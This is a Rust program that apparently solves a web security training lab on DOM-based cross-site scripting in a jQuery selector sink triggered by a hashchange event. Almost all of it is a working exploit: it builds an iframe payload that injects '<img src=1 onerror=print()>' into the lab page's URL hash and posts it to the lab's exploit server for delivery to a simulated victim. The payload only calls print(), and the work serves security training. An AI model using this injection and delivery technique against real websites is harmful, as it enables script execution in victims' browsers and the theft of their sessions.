/*****************************************************************************
*
* Lab: DOM XSS in jQuery selector sink using a hashchange event
*
* Hack Steps: 
*      1. Craft an iframe that, when loaded, will append an img element 
*         to the hash part of the URL
*      2. Deliver the exploit to the victim
*      3. The print() function will be called after they trigger the exploit
*
******************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aa2007004e6621c81e6bc71007900b1.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0ae500b7042c622881b3bb20012b00b3.exploit-server.net";

fn main() {
    let payload = format!(
        r###"<iframe src="{LAB_URL}/#" onload="this.src+='<img src=1 onerror=print()>'">"###
    );

    print!("❯❯ Delivering the exploit to the victim.. ");
    io::stdout().flush().unwrap();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The print() function will be called after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let client = build_web_client();
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
